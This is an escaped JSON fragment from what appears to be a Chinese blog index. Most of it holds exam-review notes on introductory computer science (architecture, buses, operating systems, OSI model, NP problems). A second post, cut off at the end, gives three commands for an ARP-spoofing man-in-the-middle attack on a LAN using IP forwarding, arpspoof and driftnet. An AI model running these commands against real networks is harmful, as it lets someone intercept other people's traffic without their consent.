id=\&#34;为什么说计算机中用补码做加减运算最简单\&#34;&gt;为什么说计算机中用补码做加减运算最简单&lt;/h4&gt;\n&lt;p&gt;因为使用补码可以只是使用加法运算就可以实现加减运算&lt;/p&gt;\n&lt;h4 id=\&#34;收集资料了解图灵机模型的主要应用领域有哪些\&#34;&gt;收集资料，了解图灵机模型的主要应用领域有哪些&lt;/h4&gt;\n&lt;h2 id=\&#34;第三章\&#34;&gt;第三章&lt;/h2&gt;\n&lt;h4 id=\&#34;计算机系统由哪几大部分组成各部分有什么功能\&#34;&gt;计算机系统由哪几大部分组成？各部分有什么功能？&lt;/h4&gt;\n&lt;p&gt;1、控制器：计算机的控制系统&lt;/p&gt;\n&lt;p&gt;2、运算器：计算机的运算系统&lt;/p&gt;\n&lt;p&gt;3、存储器：计算机存储系统&lt;/p&gt;\n&lt;p&gt;4、输入设备&lt;/p&gt;\n&lt;p&gt;5、输出设备&lt;/p&gt;\n&lt;h4 id=\&#34;中央处理器在计算机工作过程中起什么作用\&#34;&gt;中央处理器在计算机工作过程中起什么作用？&lt;/h4&gt;\n&lt;p&gt;运算和控制核心，是信息处理、程序运行的最终执行单元。&lt;/p&gt;\n&lt;h4 id=\&#34;什么是输入输出设备举例常见的输入输出设备\&#34;&gt;什么是输入输出设备？举例常见的输入输出设备。&lt;/h4&gt;\n&lt;p&gt;是数据处理系统的关键外部设备之一，可以和计算机本体进行交互使用。&lt;/p&gt;\n&lt;p&gt;输入设备：向计算机输入数据和信息的设备&lt;/p&gt;\n&lt;p&gt;输出设备：把计算或处理的结果或中间结果以人能识别的各种形式&lt;/p&gt;\n&lt;p&gt;鼠标、键盘、显示屏、音响&lt;/p&gt;\n&lt;h4 id=\&#34;冯诺依曼体系结构的计算机由哪几大部分组成它的工作原理是什么\&#34;&gt;冯诺依曼体系结构的计算机由哪几大部分组成？它的工作原理是什么？&lt;/h4&gt;\n&lt;p&gt;1、输入数据和程序的“输入设备”；&lt;/p&gt;\n&lt;p&gt;2、记忆程序和数据的“存储器”；&lt;/p&gt;\n&lt;p&gt;3、完成数据加工处理的“运算器”；&lt;/p&gt;\n&lt;p&gt;4、控制程序执行的“控制器”；&lt;/p&gt;\n&lt;p&gt;5、输出处理结果的“输出设备”。&lt;/p&gt;\n&lt;p&gt;工作原理主要分为存储程序和程序控制，预先要把控制计算机如何进行操作的指令序列【称为程序】和原始数据通过输入设备输送到计算机内存中，每一条指令中明确规定了计算机从哪个地址取数，进行什么操作，然后送到什么地址去等步骤。&lt;/p&gt;\n&lt;h4 id=\&#34;现代提出的非冯诺依曼计算机体系结构有哪些\&#34;&gt;现代提出的非冯诺依曼计算机体系结构有哪些？&lt;/h4&gt;\n&lt;ol&gt;\n&lt;li&gt;零指令集计算机&lt;/li&gt;\n&lt;li&gt;哈佛架构&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h4 id=\&#34;系统总线按功能分可以分为哪几类各有什么功能\&#34;&gt;系统总线按功能分可以分为哪几类？各有什么功能？&lt;/h4&gt;\n&lt;ol&gt;\n&lt;li&gt;数据总线：在CPU与RAM之间来回传送需要处理或是需要储存的数据。&lt;/li&gt;\n&lt;li&gt;地址总线：用来指定在RAM（Random Access Memory）之中储存的数据的地址。&lt;/li&gt;\n&lt;li&gt;控制总线：将微处理器控制单元（Control Unit）的信号，传送到周边设备。&lt;/li&gt;\n&lt;li&gt;扩展总线：外部设备和计算机主机进行数据通信的总线，例如ISA总线，PCI总线。&lt;/li&gt;\n&lt;li&gt;局部总线&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h4 id=\&#34;简述什么是操作系统-它的功能有哪些\&#34;&gt;简述什么是操作系统。它的功能有哪些？&lt;/h4&gt;\n&lt;p&gt;是管理计算机硬件]与软件资源的计算机程序。&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;进程管理&lt;/li&gt;\n&lt;li&gt;存储管理&lt;/li&gt;\n&lt;li&gt;设备管理&lt;/li&gt;\n&lt;li&gt;文件管理&lt;/li&gt;\n&lt;li&gt;作业管理&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h4 id=\&#34;什么是软件危机什么是软件工程软件工程过程是什么\&#34;&gt;什么是软件危机？什么是软件工程？软件工程过程是什么？&lt;/h4&gt;\n&lt;ol&gt;\n&lt;li&gt;指落后的软件生产方式无法满足迅速增长的计算机软件需求，从而导致软件开发与维护过程中出现一系列严重问题的现象。&lt;/li&gt;\n&lt;li&gt;软件工程是一门研究用工程化方法构建和维护有效的、实用的和高质量的软件的学科。它涉及程序设计语言、数据库、软件开发工具、系统平台、标准、设计模式等方面。&lt;/li&gt;\n&lt;li&gt;有瀑布模型、螺旋模型、增量模型、原型模型和RUP模型。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h4 id=\&#34;软件工程遵循哪些原则\&#34;&gt;软件工程遵循哪些原则&lt;/h4&gt;\n&lt;ol&gt;\n&lt;li&gt;确定性：软件开发过程中所有概念的表达应是确定的、无歧义性的、规范的。&lt;/li&gt;\n&lt;li&gt;一致性：整个软件系统使用一致的概念、符号和术语。&lt;/li&gt;\n&lt;li&gt;完备性：软件系统不丢失任何重要成分，可以完全实现系统所要求功能的程度。&lt;/li&gt;\n&lt;li&gt;可验证性：易于检查、测试、评审，确保系统的正确性。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h4 id=\&#34;常见程序设计语言有哪几种各有什么特点\&#34;&gt;常见程序设计语言有哪几种？各有什么特点？&lt;/h4&gt;\n&lt;ol&gt;\n&lt;li&gt;机器语言：是最低级的语言，是由二进制码组成，是最早期的一种程序语言&lt;/li&gt;\n&lt;li&gt;汇编语言：用助记符和地址符代替了二进制码，更易于编写&lt;/li&gt;\n&lt;li&gt;高级语言：相对于汇编语言又上升了一步，更接近于自然语言，如C语言、Pascal、Java、C#等都是高级语言。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=\&#34;第四章\&#34;&gt;第四章&lt;/h2&gt;\n&lt;h4 id=\&#34;欧拉是如何对格尼斯堡七桥问题进行抽象的\&#34;&gt;欧拉是如何对”格尼斯堡七桥问题“进行抽象的？&lt;/h4&gt;\n&lt;p&gt;原始问题：“是否能从某块陆地出发，经过每座桥恰好一次，最后回到出发点？”&lt;br&gt;\n抽象成数据模型：“是否能从图中的某个图出发，经过每条边恰好一次，最后回到出发节点？”&lt;br&gt;\n欧拉转化：“该图是否存在欧拉回路？”&lt;/p&gt;\n&lt;h4 id=\&#34;简述欧拉回路与哈密尔顿回路的区别\&#34;&gt;简述”欧拉回路“与”哈密尔顿回路“的区别&lt;/h4&gt;\n&lt;p&gt;从一个顶点出发每条边恰好经过一次，再回到出发点的巡回（闭通路）叫欧拉巡回，含有欧拉巡回的图叫欧拉图。&lt;/p&gt;\n&lt;p&gt;从一个顶点出发每个顶点恰好经过一次，再回到出发点的圈叫哈密尔顿圈，含哈密尔顿圈的图叫哈密尔顿图&lt;/p&gt;\n&lt;p&gt;区别欧拉回路是恰好每条边都经过一次，而哈密尔顿是恰好每个顶点都经过&lt;/p&gt;\n&lt;h4 id=\&#34;以梵天塔问题为例说明理论上可行的计算问题实际上并不一定能行\&#34;&gt;以”梵天塔问题“为例，说明理论上可行的计算问题实际上并不一定能行&lt;/h4&gt;\n&lt;h4 id=\&#34;什么是np问题并举例说明\&#34;&gt;什么是NP问题？并举例说明。&lt;/h4&gt;\n&lt;p&gt;可以在多项式时间内验证的问题称为NP问题&lt;/p&gt;\n&lt;p&gt;举例：哈密尔顿回路问题、TSP问题、顶点覆盖问题&lt;/p&gt;\n&lt;h4 id=\&#34;简述两军问题\&#34;&gt;简述”两军问题“&lt;/h4&gt;\n&lt;p&gt;两个将军 A1 和 A2 决定攻打同一个敌人 B ，任一方都没有敌人强大，所以只有共同进攻才有胜算。敌军正好位于两个将军之间，意味着信使可能会被敌军抓住。两军问题指的就是在这样的条件下两个将军如何就是否进攻达成共识&lt;/p&gt;\n&lt;p&gt;网络中用TCP的三次握手来解决这个问题&lt;/p&gt;\n&lt;h4 id=\&#34;举例说明计算机中的博弈问题\&#34;&gt;举例说明计算机中的博弈问题&lt;/h4&gt;\n&lt;p&gt;博弈树搜索&lt;/p&gt;\n&lt;p&gt;中国象棋机器博弈&lt;/p&gt;\n&lt;h4 id=\&#34;如何从哲学角度反映人工智能的本质\&#34;&gt;如何从哲学角度反映人工智能的本质&lt;/h4&gt;\n&lt;p&gt;图灵测试揭示计算本质那样揭示人类思维的本质，即能行思维。&lt;br&gt;\n中文屋子，形式化计算机仅有的语法，没有语意。因此，计算机永远也不可能代替人脑。&lt;/p&gt;\n&lt;h2 id=\&#34;第五章\&#34;&gt;第五章&lt;/h2&gt;\n&lt;h4 id=\&#34;什么是算法算法有哪几种表达方法\&#34;&gt;什么是算法？算法有哪几种表达方法？&lt;/h4&gt;\n&lt;p&gt;算法（baiAlgorithm）是指解题du方案的准确而完zhi整的描述，是一系列解决dao问题的清晰指令zhuan，算法代shu表着用系统的方法描述解决问题的策略机制。&lt;/p&gt;\n&lt;p&gt;自然语言、伪代码、流程图等表达&lt;/p&gt;\n&lt;h4 id=\&#34;简述递归算法-回溯算法-贪心算法和分治算法的特点\&#34;&gt;简述递归算法、回溯算法、贪心算法和分治算法的特点&lt;/h4&gt;\n&lt;h4 id=\&#34;什么数据结构常用的数据结构有哪些\&#34;&gt;什么数据结构？常用的数据结构有哪些？&lt;/h4&gt;\n&lt;p&gt;是计算机存储、组织数据的方式&lt;/p&gt;\n&lt;p&gt;链表、树、堆、栈图、数组等&lt;/p&gt;\n&lt;h4 id=\&#34;简述数据库管理系统的发展历程\&#34;&gt;简述数据库管理系统的发展历程&lt;/h4&gt;\n&lt;h4 id=\&#34;计算机网络的拓扑结构有哪些\&#34;&gt;计算机网络的拓扑结构有哪些？&lt;/h4&gt;\n&lt;p&gt;总线型结构、星型结构、环形结构、树型结构和网状结构。&lt;/p&gt;\n&lt;h4 id=\&#34;简述osi参考模型\&#34;&gt;简述OSI参考模型&lt;/h4&gt;\n&lt;ol&gt;\n&lt;li&gt;物理层：链路上比特流传输；&lt;/li&gt;\n&lt;li&gt;数据链路层：网络内部帧的传输；&lt;/li&gt;\n&lt;li&gt;网络层：网间两点间可达性；&lt;/li&gt;\n&lt;li&gt;传输层：保证端到端的传输；&lt;/li&gt;\n&lt;li&gt;会话层：会话的控制；&lt;/li&gt;\n&lt;li&gt;表示层：数据的表达及数据格式的转换&lt;/li&gt;\n&lt;li&gt;应用层：为用户具体应用服务。&lt;/li&gt;\n&lt;/ol&gt;\n&#34;,&#34;fileName&#34;:&#34;elbtsnl8g&#34;,&#34;abstract&#34;:&#34;&lt;h2 id=\&#34;第一章\&#34;&gt;第一章&lt;/h2&gt;\n&lt;h4 id=\&#34;讲述计算机的发展历程\&#34;&gt;讲述计算机的发展历程&lt;/h4&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;机械计算器（1930以前）&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;电子计算机的诞生（1930-1950）&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;早起电子计算机&lt;/li&gt;\n&lt;li&gt;基于冯洛伊曼模型的计算机&lt;/li&gt;\n&lt;/ol&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;计算机的诞生（1950—今）&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h4 id=\&#34;计算机有哪些特点\&#34;&gt;计算机有哪些特点&lt;/h4&gt;\n&#34;,&#34;title&#34;:&#34;计算机导论期末复习资料&#34;,&#34;tags&#34;:[],&#34;date&#34;:&#34;2021-01-26 11:43:42&#34;,&#34;dateFormat&#34;:&#34;2021-01-26&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://tjx158589.github.io/post/elbtsnl8g/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;10 min read&#34;,&#34;time&#34;:540000,&#34;words&#34;:2667,&#34;minutes&#34;:10},&#34;description&#34;:&#34;第一章\n讲述计算机的发展历程\n\n\n机械计算器（1930以前）\n\n\n电子计算机的诞生（1930-1950）\n\n早起电子计算机\n基于冯洛伊曼模型的计算机\n\n\n\n计算机的诞生（1950—今）\n\n\n计算机有哪些特点\n\n\n快速的运算能力\n足够高的计算...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%AC%AC%E4%B8%80%E7%AB%A0\&#34;&gt;第一章&lt;/a&gt;&lt;br&gt;\n*\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%AE%B2%E8%BF%B0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E5%8F%91%E5%B1%95%E5%8E%86%E7%A8%8B\&#34;&gt;讲述计算机的发展历程&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%9C%89%E5%93%AA%E4%BA%9B%E7%89%B9%E7%82%B9\&#34;&gt;计算机有哪些特点&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%AE%80%E8%BF%B0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%85%B6%E6%A0%B9%E6%9C%AC%E9%97%AE%E9%A2%98\&#34;&gt;简述计算机科学的定义及其根本问题&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%AE%80%E8%BF%B0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B8%8E%E6%8A%80%E6%9C%AF%E4%B8%93%E4%B8%9A%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB\&#34;&gt;简述计算机科学与技术专业知识体系&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%AE%80%E8%BF%B0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B8%8E%E6%8A%80%E6%9C%AF%E5%AD%A6%E7%A7%91%E7%9A%84%E4%B8%89%E4%B8%AA%E5%AD%A6%E7%A7%91%E5%BD%A2%E6%80%81\&#34;&gt;简述计算机科学与技术学科的三个学科形态&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%AC%AC%E4%BA%8C%E7%AB%A0\&#34;&gt;第二章&lt;/a&gt;&lt;br&gt;\n*\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%AE%80%E8%BF%B0%E5%9B%BE%E7%81%B5%E6%9C%BA%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%80%9D%E6%83%B3\&#34;&gt;简述图灵机模型的基本思想&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%AE%80%E8%BF%B0%E5%86%AF%E8%AF%BA%E4%BE%9D%E6%9B%BC%E5%9E%8B%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%80%9D%E6%83%B3\&#34;&gt;简述冯诺依曼型计算机的基本思想&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%B1%89%E5%AD%97%E7%BC%96%E7%A0%81%E6%9C%89%E5%93%AA%E5%87%A0%E7%B1%BB%E5%88%97%E5%87%BA%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BE%93%E5%85%A5%E7%A0%81\&#34;&gt;汉字编码有哪几类？列出几种常见的输入码&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%AE%9A%E7%82%B9%E8%A1%A8%E7%A4%BA%E6%B3%95%E5%92%8C%E6%B5%AE%E7%82%B9%E8%A1%A8%E7%A4%BA%E6%B3%95%E5%90%84%E6%9C%89%E4%BB%80%E4%B9%88%E7%89%B9%E7%82%B9\&#34;&gt;定点表示法和浮点表示法各有什么特点&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%AF%B4%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%AD%E7%94%A8%E8%A1%A5%E7%A0%81%E5%81%9A%E5%8A%A0%E5%87%8F%E8%BF%90%E7%AE%97%E6%9C%80%E7%AE%80%E5%8D%95\&#34;&gt;为什么说计算机中用补码做加减运算最简单&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%94%B6%E9%9B%86%E8%B5%84%E6%96%99%E4%BA%86%E8%A7%A3%E5%9B%BE%E7%81%B5%E6%9C%BA%E6%A8%A1%E5%9E%8B%E7%9A%84%E4%B8%BB%E8%A6%81%E5%BA%94%E7%94%A8%E9%A2%86%E5%9F%9F%E6%9C%89%E5%93%AA%E4%BA%9B\&#34;&gt;收集资料，了解图灵机模型的主要应用领域有哪些&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%AC%AC%E4%B8%89%E7%AB%A0\&#34;&gt;第三章&lt;/a&gt;&lt;br&gt;\n*\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%94%B1%E5%93%AA%E5%87%A0%E5%A4%A7%E9%83%A8%E5%88%86%E7%BB%84%E6%88%90%E5%90%84%E9%83%A8%E5%88%86%E6%9C%89%E4%BB%80%E4%B9%88%E5%8A%9F%E8%83%BD\&#34;&gt;计算机系统由哪几大部分组成？各部分有什么功能？&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%B8%AD%E5%A4%AE%E5%A4%84%E7%90%86%E5%99%A8%E5%9C%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%B7%A5%E4%BD%9C%E8%BF%87%E7%A8%8B%E4%B8%AD%E8%B5%B7%E4%BB%80%E4%B9%88%E4%BD%9C%E7%94%A8\&#34;&gt;中央处理器在计算机工作过程中起什么作用？&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BB%80%E4%B9%88%E6%98%AF%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E8%AE%BE%E5%A4%87%E4%B8%BE%E4%BE%8B%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E8%AE%BE%E5%A4%87\&#34;&gt;什么是输入输出设备？举例常见的输入输出设备。&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%86%AF%E8%AF%BA%E4%BE%9D%E6%9B%BC%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E7%9A%84%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%94%B1%E5%93%AA%E5%87%A0%E5%A4%A7%E9%83%A8%E5%88%86%E7%BB%84%E6%88%90%E5%AE%83%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88\&#34;&gt;冯诺依曼体系结构的计算机由哪几大部分组成？它的工作原理是什么？&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%8E%B0%E4%BB%A3%E6%8F%90%E5%87%BA%E7%9A%84%E9%9D%9E%E5%86%AF%E8%AF%BA%E4%BE%9D%E6%9B%BC%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E6%9C%89%E5%93%AA%E4%BA%9B\&#34;&gt;现代提出的非冯诺依曼计算机体系结构有哪些？&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF%E6%8C%89%E5%8A%9F%E8%83%BD%E5%88%86%E5%8F%AF%E4%BB%A5%E5%88%86%E4%B8%BA%E5%93%AA%E5%87%A0%E7%B1%BB%E5%90%84%E6%9C%89%E4%BB%80%E4%B9%88%E5%8A%9F%E8%83%BD\&#34;&gt;系统总线按功能分可以分为哪几类？各有什么功能？&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%AE%80%E8%BF%B0%E4%BB%80%E4%B9%88%E6%98%AF%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%AE%83%E7%9A%84%E5%8A%9F%E8%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B\&#34;&gt;简述什么是操作系统。它的功能有哪些？&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BB%80%E4%B9%88%E6%98%AF%E8%BD%AF%E4%BB%B6%E5%8D%B1%E6%9C%BA%E4%BB%80%E4%B9%88%E6%98%AF%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E8%BF%87%E7%A8%8B%E6%98%AF%E4%BB%80%E4%B9%88\&#34;&gt;什么是软件危机？什么是软件工程？软件工程过程是什么？&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E9%81%B5%E5%BE%AA%E5%93%AA%E4%BA%9B%E5%8E%9F%E5%88%99\&#34;&gt;软件工程遵循哪些原则&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%B8%B8%E8%A7%81%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E8%AF%AD%E8%A8%80%E6%9C%89%E5%93%AA%E5%87%A0%E7%A7%8D%E5%90%84%E6%9C%89%E4%BB%80%E4%B9%88%E7%89%B9%E7%82%B9\&#34;&gt;常见程序设计语言有哪几种？各有什么特点？&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%AC%AC%E5%9B%9B%E7%AB%A0\&#34;&gt;第四章&lt;/a&gt;&lt;br&gt;\n*\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%AC%A7%E6%8B%89%E6%98%AF%E5%A6%82%E4%BD%95%E5%AF%B9%E6%A0%BC%E5%B0%BC%E6%96%AF%E5%A0%A1%E4%B8%83%E6%A1%A5%E9%97%AE%E9%A2%98%E8%BF%9B%E8%A1%8C%E6%8A%BD%E8%B1%A1%E7%9A%84\&#34;&gt;欧拉是如何对”格尼斯堡七桥问题“进行抽象的？&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%AE%80%E8%BF%B0%E6%AC%A7%E6%8B%89%E5%9B%9E%E8%B7%AF%E4%B8%8E%E5%93%88%E5%AF%86%E5%B0%94%E9%A1%BF%E5%9B%9E%E8%B7%AF%E7%9A%84%E5%8C%BA%E5%88%AB\&#34;&gt;简述”欧拉回路“与”哈密尔顿回路“的区别&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BB%A5%E6%A2%B5%E5%A4%A9%E5%A1%94%E9%97%AE%E9%A2%98%E4%B8%BA%E4%BE%8B%E8%AF%B4%E6%98%8E%E7%90%86%E8%AE%BA%E4%B8%8A%E5%8F%AF%E8%A1%8C%E7%9A%84%E8%AE%A1%E7%AE%97%E9%97%AE%E9%A2%98%E5%AE%9E%E9%99%85%E4%B8%8A%E5%B9%B6%E4%B8%8D%E4%B8%80%E5%AE%9A%E8%83%BD%E8%A1%8C\&#34;&gt;以”梵天塔问题“为例，说明理论上可行的计算问题实际上并不一定能行&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BB%80%E4%B9%88%E6%98%AFnp%E9%97%AE%E9%A2%98%E5%B9%B6%E4%B8%BE%E4%BE%8B%E8%AF%B4%E6%98%8E\&#34;&gt;什么是NP问题？并举例说明。&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%AE%80%E8%BF%B0%E4%B8%A4%E5%86%9B%E9%97%AE%E9%A2%98\&#34;&gt;简述”两军问题“&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%B8%BE%E4%BE%8B%E8%AF%B4%E6%98%8E%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%AD%E7%9A%84%E5%8D%9A%E5%BC%88%E9%97%AE%E9%A2%98\&#34;&gt;举例说明计算机中的博弈问题&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%A6%82%E4%BD%95%E4%BB%8E%E5%93%B2%E5%AD%A6%E8%A7%92%E5%BA%A6%E5%8F%8D%E6%98%A0%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E7%9A%84%E6%9C%AC%E8%B4%A8\&#34;&gt;如何从哲学角度反映人工智能的本质&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%AC%AC%E4%BA%94%E7%AB%A0\&#34;&gt;第五章&lt;/a&gt;&lt;br&gt;\n*\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BB%80%E4%B9%88%E6%98%AF%E7%AE%97%E6%B3%95%E7%AE%97%E6%B3%95%E6%9C%89%E5%93%AA%E5%87%A0%E7%A7%8D%E8%A1%A8%E8%BE%BE%E6%96%B9%E6%B3%95\&#34;&gt;什么是算法？算法有哪几种表达方法？&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%AE%80%E8%BF%B0%E9%80%92%E5%BD%92%E7%AE%97%E6%B3%95-%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95%E5%92%8C%E5%88%86%E6%B2%BB%E7%AE%97%E6%B3%95%E7%9A%84%E7%89%B9%E7%82%B9\&#34;&gt;简述递归算法、回溯算法、贪心算法和分治算法的特点&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BB%80%E4%B9%88%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%B8%B8%E7%94%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%9C%89%E5%93%AA%E4%BA%9B\&#34;&gt;什么数据结构？常用的数据结构有哪些？&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%AE%80%E8%BF%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8F%91%E5%B1%95%E5%8E%86%E7%A8%8B\&#34;&gt;简述数据库管理系统的发展历程&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9A%84%E6%8B%93%E6%89%91%E7%BB%93%E6%9E%84%E6%9C%89%E5%93%AA%E4%BA%9B\&#34;&gt;计算机网络的拓扑结构有哪些？&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%AE%80%E8%BF%B0osi%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B\&#34;&gt;简述OSI参考模型&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;、### 其实这个也是非常简单，只有三句命令就可以实现。没啥技术难度，不过只能在局域网内实现。&lt;/p&gt;\n&lt;h5 id=\&#34;1-更改转发模式\&#34;&gt;1、更改转发模式&lt;/h5&gt;\n&lt;pre&gt;&lt;code&gt;echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward\n&lt;/code&gt;&lt;/pre&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1gf2q4h2n18j30vv0u07wh.jpg\&#34; alt=\&#34;image-20200523215235878\&#34; style=\&#34;zoom:67%;\&#34; /&gt;\n&lt;!-- more --&gt;\n&lt;h5 id=\&#34;2-arp攻击\&#34;&gt;2、arp攻击&lt;/h5&gt;\n&lt;pre&gt;&lt;code&gt; arpspoof -i eth0 -t 192.168.1.1  192.168.1.100\n \n#arpspoof -i eth0 -t [路由器ip] [目标主机ip]\n&lt;/code&gt;&lt;/pre&gt;\n&lt;blockquote&gt;\n&lt;p&gt;&lt;code&gt;192.168.123.1&lt;/code&gt;是我路由器地址，&lt;code&gt;192.168.123.116&lt;/code&gt;是我笔记本的地址&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1gf2pnalgspj30vq0u01ky.jpg\&#34; alt=\&#34;image-20200523213603947\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;h5 id=\&#34;3-数据还原分析\&#34;&gt;3、数据还原分析&lt;/h5&gt;\n&lt;pre&gt;&lt;code&gt;# driftnet -i eth0\n//eth0是网卡\n&lt;/code&gt;&lt;/pre&gt;\n&lt;img 